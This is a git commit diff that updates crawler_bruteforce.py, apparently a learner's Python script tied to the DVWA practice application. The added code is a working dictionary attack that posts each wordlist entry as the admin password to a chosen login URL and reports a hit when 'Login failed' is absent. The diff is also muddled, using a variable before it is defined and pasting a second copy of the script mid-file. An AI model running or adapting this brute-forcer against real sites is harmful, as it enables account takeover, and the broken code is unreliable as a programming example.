ebdd14e0cc2399b1ec4d0fd0c8f9e0c510a89e6a
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-09-16 12:46:35 -0700

    Update crawler_bruteforce.py

--- crawler_bruteforce.py
+++ crawler_bruteforce.py
@@ -3,6 +3,34 @@
 import requests
 
 target_url = raw_input("Enter target URL: ")
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
+
+#data_dict stored as key value pairs
+print(response.content)
+
+passwords_list = raw_input("Enter exact path of word list for subdomains: ")
+
+try:
+    with open(passwords_list, "r") as wordlist_file:
+        for line in wordlist_file:
+            word = line.strip() #strip - built in method to work with strings; removes whitespace
+            data_dict["password"] = word
+            response = requests.post(target_url, data=data_dict)        
+            if "Login failed" not in response.content:
+                print("[+] Password found: " + word)
+                exit()
+except:
+    print("Word list file not found, check path and filename")
+
+    
+    
+    
+    
+#!/usr/bin/env python
+
+import requests
+
+target_url = raw_input("Enter target URL: ")
 data_dict = {"username": "testui", "password": "testpw", "Login": "submit"} #field names taken from DVWA;
 #<form action="login.php" method="post">
 #<input class="loginInput" name="username" type="text">
@@ -16,5 +44,6 @@ try:
     with open(passwords_list, "r") as wordlist_file:
         for line in wordlist_file:
             word = line.strip() #strip - built in method to work with strings; removes whitespace
+            
 except:
     print("Word list file not found, check path and filename")
